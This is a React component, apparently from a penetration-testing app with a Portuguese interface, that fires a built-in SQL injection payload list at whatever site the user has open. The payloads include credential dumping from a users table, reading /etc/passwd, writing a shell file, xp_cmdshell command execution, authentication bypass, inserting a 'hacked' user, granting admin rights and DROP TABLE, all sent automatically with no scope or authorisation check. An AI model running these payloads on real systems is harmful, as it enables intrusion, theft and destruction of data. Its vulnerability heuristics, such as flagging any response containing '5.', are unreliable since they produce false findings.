import { useState, useRef, useCallback } from 'react'
import { 
  Database, Play, Square, Terminal, Bug, AlertTriangle, 
  Shield, Copy, Check, Loader2, ExternalLink, ChevronDown, 
  ChevronRight, Zap, RefreshCw, Globe, Trash2, Download 
} from 'lucide-react'
import { getApi } from '../../utils/platform'

// Categorias avançadas de payloads SQLi
const SQLI_PAYLOADS = {
  'Union Based': [
    { name: 'Union Select (int)', payload: "' UNION SELECT 1--", endpoint: '' },
    { name: 'Union Select (str)', payload: "' UNION SELECT 'test'--", endpoint: '' },
    { name: 'Union Select (multi)', payload: "' UNION SELECT 1,2,3,4,5--", endpoint: '' },
    { name: 'Union Select NULL', payload: "' UNION SELECT NULL--", endpoint: '' },
    { name: 'Union Select ALL', payload: "' UNION ALL SELECT 1--", endpoint: '' },
    { name: 'Union Select @@version', payload: "' UNION SELECT @@version--", endpoint: '' },
    { name: 'Union Select table_name', payload: "' UNION SELECT table_name FROM information_schema.tables--", endpoint: '' },
    { name: 'Union Select column_name', payload: "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", endpoint: '' },
    { name: 'Union Concat users', payload: "' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--", endpoint: '' },
    { name: 'Union Select LOAD_FILE', payload: "' UNION SELECT LOAD_FILE('/etc/passwd')--", endpoint: '' },
    { name: 'Union INTO OUTFILE', payload: "' UNION SELECT 'shell' INTO OUTFILE '/tmp/shell.php'--", endpoint: '' },
  ],
  'Error Based': [
    { name: 'Error ExtractValue', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--", endpoint: '' },
    { name: 'Error UpdateXML', payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--", endpoint: '' },
    { name: 'Error Convert', payload: "' AND 1=CONVERT(int,(SELECT @@version))--", endpoint: '' },
    { name: 'Error Double Query', payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", endpoint: '' },
  ],
  'Boolean Blind': [
    { name: 'AND 1=1', payload: "' AND 1=1--", endpoint: '' },
    { name: 'AND 1=2', payload: "' AND 1=2--", endpoint: '' },
    { name: 'OR 1=1', payload: "' OR 1=1--", endpoint: '' },
    { name: 'OR 1=2', payload: "' OR 1=2--", endpoint: '' },
    { name: 'AND substring(version(),1,1)=...', payload: "' AND SUBSTRING(VERSION(),1,1)='5'--", endpoint: '' },
    { name: 'AND ascii(substring(...))=...', payload: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>100--", endpoint: '' },
    { name: 'AND (SELECT COUNT(*) FROM users)>0', payload: "' AND (SELECT COUNT(*) FROM users)>0--", endpoint: '' },
  ],
  'Time Blind': [
    { name: 'SLEEP(5)', payload: "' AND SLEEP(5)--", endpoint: '' },
    { name: 'BENCHMARK', payload: "' AND BENCHMARK(5000000,MD5('test'))--", endpoint: '' },
    { name: 'pg_sleep', payload: "' AND pg_sleep(5)--", endpoint: '' },
    { name: 'WAITFOR DELAY', payload: "'; WAITFOR DELAY '0:0:5'--", endpoint: '' },
    { name: 'CASE WHEN SLEEP', payload: "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END)--", endpoint: '' },
    { name: 'IF SLEEP', payload: "' AND IF(1=1,SLEEP(5),0)--", endpoint: '' },
  ],
  'Stacked Queries': [
    { name: 'Simple INSERT', payload: "'; INSERT INTO users(username,password) VALUES('hacked','pwned')--", endpoint: '' },
    { name: 'UPDATE admin', payload: "'; UPDATE users SET admin=1 WHERE username='admin'--", endpoint: '' },
    { name: 'DROP TABLE', payload: "'; DROP TABLE users-- (PERIGOSO!)", endpoint: '' },
    { name: 'XP_CMDSHELL (MSSQL)', payload: "'; EXEC xp_cmdshell('whoami')--", endpoint: '' },
    { name: 'COPY TO (PostgreSQL)', payload: "'; COPY (SELECT * FROM users) TO '/tmp/users.csv'--", endpoint: '' },
  ],
  'Auth Bypass': [
    { name: 'admin\' --', payload: "admin' --", endpoint: '' },
    { name: 'admin\' #', payload: "admin' #", endpoint: '' },
    { name: 'OR 1=1', payload: "' OR 1=1 --", endpoint: '' },
    { name: 'OR ""="', payload: "' OR ''='", endpoint: '' },
    { name: 'admin\' OR \'1\'=\'1', payload: "admin' OR '1'='1", endpoint: '' },
    { name: 'UNION bypass', payload: "' UNION SELECT 1,'admin','hash'--", endpoint: '' },
    { name: 'Double OR', payload: "' OR 1=1 OR 'x'='x", endpoint: '' },
    { name: 'Backtick bypass', payload: "` OR `1`=`1", endpoint: '' },
    { name: 'LIMIT bypass', payload: "' OR 1=1 LIMIT 1--", endpoint: '' },
  ],
  'Tautologies': [
    { name: 'Single Quote', payload: "' OR '1'='1", endpoint: '' },
    { name: 'Double quote', payload: `" OR "1"="1`, endpoint: '' },
    { name: 'Parenthesis', payload: ") OR (1=1", endpoint: '' },
    { name: 'LIKE', payload: "' OR username LIKE '%admin%'--", endpoint: '' },
    { name: 'IN', payload: "' OR '1' IN ('1','2','3')--", endpoint: '' },
    { name: 'BETWEEN', payload: "' OR 1 BETWEEN 1 AND 2--", endpoint: '' },
  ],
  'DB Enumeration': [
    { name: 'DB Version', payload: "' UNION SELECT @@version--", endpoint: '' },
    { name: 'Current User', payload: "' UNION SELECT user()--", endpoint: '' },
    { name: 'Database Name', payload: "' UNION SELECT database()--", endpoint: '' },
    { name: 'All Tables', payload: "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--", endpoint: '' },
    { name: 'All Columns (users)', payload: "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--", endpoint: '' },
    { name: 'Schema Names', payload: "' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--", endpoint: '' },
    { name: 'File Privileges', payload: "' UNION SELECT GROUP_CONCAT(user,file_priv) FROM mysql.user--", endpoint: '' },
  ],
} as const

interface SQLiResult {
  id: string
  payload: string
  endpoint: string
  category: string
  timestamp: number
  status: number
  responseTime: number
  responsePreview: string
  vulnerable: boolean
  evidence: string
}

export default function SQLiAdvancedPanel({ targetUrl }: { targetUrl: string }) {
  const [results, setResults] = useState<SQLiResult[]>([])
  const [isRunning, setIsRunning] = useState(false)
  const [currentPayload, setCurrentPayload] = useState('')
  const [progress, setProgress] = useState(0)
  const [totalPayloads, setTotalPayloads] = useState(0)
  const [selectedCategories, setSelectedCategories] = useState<Set<string>>(new Set(['Union Based', 'Error Based', 'Boolean Blind', 'Time Blind']))
  const [customEndpoint, setCustomEndpoint] = useState('')
  const [customHeaders, setCustomHeaders] = useState('')
  const [expandedResults, setExpandedResults] = useState<Set<string>>(new Set())
  const abortRef = useRef<AbortController | null>(null)

  const toggleCategory = (cat: string) => {
    setSelectedCategories(prev => {
      const next = new Set(prev)
      next.has(cat) ? next.delete(cat) : next.add(cat)
      return next
    })
  }

  const getPayloadsToTest = useCallback(() => {
    const payloads: Array<{ name: string; payload: string; category: string; endpoint: string }> = []
    for (const [cat, items] of Object.entries(SQLI_PAYLOADS)) {
      if (selectedCategories.has(cat)) {
        for (const item of items) {
          payloads.push({
            name: item.name,
            payload: item.payload,
            category: cat,
            endpoint: customEndpoint.trim() || '',
          })
        }
      }
    }
    return payloads
  }, [selectedCategories, customEndpoint])

  const testEndpoint = useCallback(async (baseUrl: string, endpoint: string): Promise<string> => {
    // Se endpoint ja for URL completa
    if (endpoint.startsWith('http')) return endpoint
    
    // Se tem parametro, extrai
    if (endpoint.includes('?')) {
      const [path, query] = endpoint.split('?')
      const base = new URL(baseUrl)
      return `${base.protocol}//${base.host}${path}?${query}`
    }
    
    if (endpoint.startsWith('/')) {
      const base = new URL(baseUrl)
      return `${base.protocol}//${base.host}${endpoint}`
    }
    
    return endpoint
  }, [])

  const injectPayload = (url: string, param: string, payload: string): string => {
    try {
      const u = new URL(url)
      const params = new URLSearchParams(u.search)
      if (params.has(param)) {
        params.set(param, params.get(param)! + payload)
      } else {
        // Adiciona parametro com payload
        for (const [key] of params) {
          if (key.toLowerCase().includes('id') || key.toLowerCase().includes('q') || key.toLowerCase().includes('search')) {
            params.set(key, params.get(key)! + payload)
            break
          }
        }
        if (!params.has('id') && !params.has('q')) {
          // Tenta buscar em parametros comuns
          const potentialParams = ['id', 'user', 'username', 'page', 'product', 'q', 'search', 'query', 'cat', 'category']
          for (const p of potentialParams) {
            if (params.has(p)) {
              params.set(p, params.get(p)! + payload)
              break
            }
          }
        }
      }
      u.search = params.toString()
      return u.toString()
    } catch {
      // Se nao e URL valida, concatena direto
      if (url.includes('=')) {
        return url + payload
      }
      return url + '?id=' + encodeURIComponent(payload)
    }
  }

  const runSQLiTests = async () => {
    if (isRunning || !targetUrl || targetUrl === 'about:blank') return
    setIsRunning(true)
    setResults([])
    
    const api = getApi()
    if (!api) return
    
    const payloads = getPayloadsToTest()
    setTotalPayloads(payloads.length)
    setProgress(0)
    
    abortRef.current = new AbortController()
    const signal = abortRef.current.signal
    
    const headers = customHeaders.trim()
      ? Object.fromEntries(customHeaders.split('\n').filter(h => h.includes(':')).map(h => {
          const [k, ...v] = h.split(':')
          return [k.trim(), v.join(':').trim()]
        }))
      : {}
    
    for (let i = 0; i < payloads.length; i++) {
      if (signal.aborted) break
      
      const { name, payload, category } = payloads[i]
      setCurrentPayload(`${category}: ${name}`)
      setProgress(i + 1)
      
      try {
        const endpoint = await testEndpoint(targetUrl, payloads[i].endpoint || targetUrl)
        const testUrl = injectPayload(endpoint, 'id', payload)
        
        const startTime = Date.now()
        let response: any
        
        try {
          response = await (api as any).securityPentestRequest({
            url: testUrl,
            method: 'GET',
            headers: { ...headers, 'User-Agent': 'Ezek-SQLi-Tester/1.0' },
            timeout: 10000,
            signal,
          })
        } catch (e: any) {
          if (e.name === 'AbortError') break
          // Timed out = pode ser time-based blind positivo
          const elapsed = Date.now() - startTime
          const isSlow = elapsed > 4000
          
          const result: SQLiResult = {
            id: `sqli-${Date.now()}-${i}`,
            payload,
            endpoint: testUrl,
            category,
            timestamp: Date.now(),
            status: 0,
            responseTime: elapsed,
            responsePreview: isSlow ? `⏱️ TIMEOUT (${elapsed}ms) — possível Time-Based Blind positivo!` : 'TIMEOUT',
            vulnerable: isSlow,
            evidence: isSlow ? `Servidor demorou ${elapsed}ms para responder — indicativo de SLEEP/BENCHMARK executado` : '',
          }
          setResults(prev => [...prev, result])
          continue
        }
        
        const elapsed = Date.now() - startTime
        const status = response?.status || response?.statusCode || 0
        const body = typeof response?.body === 'string' ? response.body : JSON.stringify(response?.body || response?.data || '') || ''
        const bodyPreview = body.slice(0, 500)
        
        // Heurísticas de vulnerabilidade
        let vulnerable = false
        let evidence = ''
        const bodyLower = bodyPreview.toLowerCase()
        
        // Detecta vazamento de dados
        if (bodyLower.includes('sql') && (bodyLower.includes('error') || bodyLower.includes('syntax') || bodyLower.includes('warning'))) {
          vulnerable = true
          evidence = `Erro SQL exposto: o servidor revelou mensagens de erro do banco de dados`
        } else if (bodyLower.includes('mysql_fetch') || bodyLower.includes('pg_query') || bodyLower.includes('sqlite') || bodyLower.includes('ora-')) {
          vulnerable = true
          evidence = `Erro de driver SQL exposto: vazamento de informação do banco de dados`
        } else if (/you have an error in your sql/i.test(bodyPreview)) {
          vulnerable = true
          evidence = `Erro de sintaxe SQL exposto: injeção confirmada via error-based`
        } else if (bodyLower.includes('@@version') || bodyLower.includes('5.') || bodyLower.includes('8.0') || /mysql|postgresql|mariadb|mssql/.test(bodyLower)) {
          vulnerable = true
          evidence = `Informação do banco de dados vazou na resposta: possível UNION SELECT bem-sucedido`
        } else if (bodyLower.includes('admin') && payload.toLowerCase().includes('admin') && status === 200) {
          vulnerable = true
          evidence = `Ignorou autenticação: acesso obtido com payload de Auth Bypass (HTTP 200)`
        }
        
        const result: SQLiResult = {
          id: `sqli-${Date.now()}-${i}`,
          payload,
          endpoint: testUrl,
          category,
          timestamp: Date.now(),
          status,
          responseTime: elapsed,
          responsePreview: bodyPreview,
          vulnerable,
          evidence,
        }
        
        setResults(prev => [...prev, result])
      } catch (err: any) {
        if (err.name === 'AbortError') break
      }
    }
    
    setIsRunning(false)
    setCurrentPayload('')
  }

  const stopTests = () => {
    abortRef.current?.abort()
    setIsRunning(false)
  }

  const clearResults = () => setResults([])

  const vulnerableCount = results.filter(r => r.vulnerable).length
  const totalCategories = Object.keys(SQLI_PAYLOADS).length

  return (
    <div className="h-full flex flex-col bg-nova-bg">
      {/* Header */}
      <div className="border-b border-nova-border bg-nova-bg-secondary px-4 py-3 shrink-0">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <Database size={15} className="text-red-400" />
            <h2 className="text-xs font-bold uppercase tracking-wider text-nova-text">
              SQL Injection — Ferramentas Avançadas
            </h2>
          </div>
          <div className="flex items-center gap-2">
            {vulnerableCount > 0 && (
              <span className="text-[10px] bg-red-500/20 text-red-400 px-2 py-0.5 rounded-full font-bold">
                {vulnerableCount} VULN!
              </span>
            )}
            <span className="text-[10px] text-nova-text-muted">
              {results.length} testados
            </span>
          </div>
        </div>

        {/* Controles */}
        <div className="flex items-center gap-2">
          <input
            value={customEndpoint}
            onChange={e => setCustomEndpoint(e.target.value)}
            placeholder="Endpoint específico (ex: /api/login)"
            className="flex-1 bg-nova-input-bg border border-nova-input-border rounded px-3 py-1.5 text-[11px] font-mono text-nova-text outline-none focus:border-red-500/50"
          />
          {isRunning ? (
            <button
              onClick={stopTests}
              className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-red-500/20 text-red-400 border border-red-500/30 text-xs font-medium hover:bg-red-500/30"
            >
              <Square size={11} /> Parar
            </button>
          ) : (
            <button
              onClick={runSQLiTests}
              disabled={!targetUrl || targetUrl === 'about:blank'}
              className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-red-500/20 text-red-400 border border-red-500/30 text-xs font-medium hover:bg-red-500/30 disabled:opacity-40"
            >
              <Play size={11} /> Iniciar Testes
            </button>
          )}
          <button
            onClick={clearResults}
            disabled={results.length === 0}
            className="p-1.5 rounded-lg text-nova-text-muted hover:text-nova-text hover:bg-nova-hover disabled:opacity-30"
          >
            <Trash2 size={13} />
          </button>
        </div>
      </div>

      {/* Progresso */}
      {isRunning && (
        <div className="h-1 bg-nova-bg-secondary shrink-0">
          <div
            className="h-full bg-red-500 transition-all duration-300"
            style={{ width: totalPayloads > 0 ? `${(progress / totalPayloads) * 100}%` : '0%' }}
          />
        </div>
      )}
      {isRunning && (
        <div className="px-4 py-1 bg-nova-bg-secondary border-b border-nova-border shrink-0 flex items-center gap-2">
          <Loader2 size={10} className="text-red-400 animate-spin" />
          <span className="text-[10px] text-nova-text-muted">
            Testando: {currentPayload} ({progress}/{totalPayloads})
          </span>
        </div>
      )}

      {/* Categorias */}
      <div className="px-4 py-2 border-b border-nova-border shrink-0 flex flex-wrap gap-1.5">
        {Object.keys(SQLI_PAYLOADS).map(cat => (
          <button
            key={cat}
            onClick={() => toggleCategory(cat)}
            className={`text-[9px] px-2 py-1 rounded-full font-medium transition-colors ${
              selectedCategories.has(cat)
                ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                : 'bg-nova-bg-secondary text-nova-text-muted border border-nova-border'
            }`}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Resultados */}
      <div className="flex-1 overflow-auto scrollbar-thin bg-[#0a0f0d]">
        {results.length === 0 ? (
          <div className="flex items-center justify-center h-full text-nova-text-muted">
            <div className="text-center">
              <Terminal size={32} className="mx-auto mb-3 opacity-30" />
              <p className="text-xs font-medium mb-1">SQL Injection Avançado</p>
              <p className="text-[10px] max-w-[300px]">
                Selecione as categorias de payload e clique em <span className="text-red-400">Iniciar Testes</span>.
                {targetUrl && targetUrl !== 'about:blank' ? (
                  <span className="block mt-1 text-green-400/70">Alvo: {targetUrl}</span>
                ) : (
                  <span className="block mt-1 text-red-400/70">Navegue em um site antes de testar.</span>
                )}
              </p>
              <div className="mt-4 grid grid-cols-2 gap-1 text-left max-w-[340px] mx-auto">
                {[
                  ['Union Based', 'Extrai dados diretamente do banco'],
                  ['Error Based', 'Explora erros SQL para vazar info'],
                  ['Boolean Blind', 'Inferência bit a bit dos dados'],
                  ['Time Blind', 'Temporização revela estrutura do DB'],
                  ['Stacked Queries', 'Executa múltiplas queries maliciosas'],
                  ['Auth Bypass', 'Bypassa autenticação via SQL'],
                ].map(([label, desc]) => (
                  <div key={label} className="bg-nova-bg-secondary rounded p-2 border border-nova-border">
                    <p className="text-[10px] font-bold text-red-400">{label}</p>
                    <p className="text-[8px] text-nova-text-muted mt-0.5">{desc}</p>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ) : (
          <div className="divide-y divide-nova-border">
            {results.map((result) => (
              <div
                key={result.id}
                className={`px-3 py-2 ${
                  result.vulnerable
                    ? 'bg-red-500/5 border-l-2 border-l-red-500'
                    : 'hover:bg-nova-bg-secondary/50'
                }`}
              >
                <div
                  className="flex items-start gap-2 cursor-pointer"
                  onClick={() => {
                    setExpandedResults(prev => {
                      const next = new Set(prev)
                      next.has(result.id) ? next.delete(result.id) : next.add(result.id)
                      return next
                    })
                  }}
                >
                  <div className="flex-shrink-0 mt-0.5">
                    {result.vulnerable ? (
                      <AlertTriangle size={14} className="text-red-400" />
                    ) : (
                      <Shield size={14} className="text-nova-text-muted" />
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className={`text-[10px] font-mono font-bold ${
                        result.vulnerable ? 'text-red-400' : 'text-nova-text'
                      }`}>
                        {result.payload}
                      </span>
                      <span className="text-[8px] text-nova-text-muted">{result.category}</span>
                    </div>
                    <div className="flex items-center gap-3 mt-0.5">
                      <span className={`text-[9px] font-mono ${
                        result.status >= 500 ? 'text-red-400' :
                        result.status >= 400 ? 'text-orange-400' :
                        result.status >= 200 ? 'text-green-400' :
                        'text-gray-400'
                      }`}>
                        {result.status || 'TIMEOUT'}
                      </span>
                      <span className="text-[9px] text-nova-text-muted">{result.responseTime}ms</span>
                      {result.vulnerable && (
                        <span className="text-[9px] text-red-400 font-bold">VULNERÁVEL</span>
                      )}
                    </div>
                    {result.vulnerable && result.evidence && (
                      <p className="text-[9px] text-red-400/80 mt-0.5">{result.evidence}</p>
                    )}
                  </div>
                  <div className="flex-shrink-0">
                    {expandedResults.has(result.id) ? (
                      <ChevronDown size={12} className="text-nova-text-muted" />
                    ) : (
                      <ChevronRight size={12} className="text-nova-text-muted" />
                    )}
                  </div>
                </div>

                {/* Detalhes expandidos */}
                {expandedResults.has(result.id) && (
                  <div className="mt-2 ml-6 p-2 bg-nova-bg rounded border border-nova-border">
                    <p className="text-[9px] text-nova-text-muted mb-1">Endpoint testado:</p>
                    <p className="text-[9px] font-mono text-nova-accent break-all mb-2">{result.endpoint}</p>
                    <p className="text-[9px] text-nova-text-muted mb-1">Resposta do servidor ({result.responsePreview.length} bytes):</p>
                    <pre className="text-[9px] font-mono text-nova-text bg-nova-bg-secondary rounded p-2 max-h-[200px] overflow-auto whitespace-pre-wrap border border-nova-border">
                      {result.responsePreview}
                    </pre>
                    <div className="flex gap-2 mt-2">
                      <button
                        onClick={() => navigator.clipboard.writeText(result.payload)}
                        className="flex items-center gap-1 text-[9px] text-nova-text-muted hover:text-nova-accent"
                      >
                        <Copy size={10} /> Copiar
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Status bar */}
      <div className="h-6 px-3 border-t border-nova-border bg-nova-bg-secondary flex items-center justify-between shrink-0">
        <span className="text-[9px] text-nova-text-muted">
          {totalPayloads > 0 && `Payloads: ${getPayloadsToTest().length} em ${selectedCategories.size}/${totalCategories} categorias`}
        </span>
        <span className={`text-[9px] ${vulnerableCount > 0 ? 'text-red-400 font-bold' : 'text-nova-text-muted'}`}>
          {vulnerableCount > 0 ? `${vulnerableCount} vulnerabilidades encontradas` : 'Nenhuma vulnerabilidade encontrada'}
        </span>
      </div>
    </div>
  )
}
